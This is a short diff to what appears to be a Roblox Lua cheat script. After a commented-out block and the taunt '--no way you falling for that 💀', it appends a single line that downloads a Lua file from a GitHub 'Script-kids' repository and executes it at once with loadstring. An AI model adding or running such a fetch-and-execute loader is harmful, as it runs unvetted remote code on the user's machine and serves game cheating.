@@ -220,3 +220,6 @@ end
 autoSaveConfig()
 ]]
 --no way you falling for that 💀
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Pnsdgsa/Script-kids/refs/heads/main/Scripthub/Darahub/evade/macro%20vip%20command.lua'))()
